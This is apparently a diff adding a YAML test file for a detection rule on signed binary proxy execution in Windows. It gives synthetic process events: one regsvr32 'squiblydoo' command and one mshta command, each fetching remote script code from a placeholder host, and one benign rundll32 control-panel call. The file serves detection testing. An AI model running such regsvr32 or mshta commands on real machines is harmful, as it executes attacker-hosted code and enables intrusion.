@@ -1,0 +1,15 @@
+# Tests for C-009 — Signed Binary Proxy Execution. Synthetic data only.
+rule: C-009_signed_binary_proxy_execution
+cases:
+  - name: regsvr32 squiblydoo (remote scrobj) fires
+    should_fire: true
+    events:
+      - { Image: 'C:\Windows\System32\regsvr32.exe', CommandLine: 'regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll', ParentImage: 'C:\Windows\System32\cmd.exe' }
+  - name: mshta remote payload fires
+    should_fire: true
+    events:
+      - { Image: 'C:\Windows\System32\mshta.exe', CommandLine: 'mshta http://x/y.hta', ParentImage: 'C:\Windows\explorer.exe' }
+  - name: benign rundll32 (local DLL, no url/script) does not fire
+    should_fire: false
+    events:
+      - { Image: 'C:\Windows\System32\rundll32.exe', CommandLine: 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl', ParentImage: 'C:\Windows\explorer.exe' }
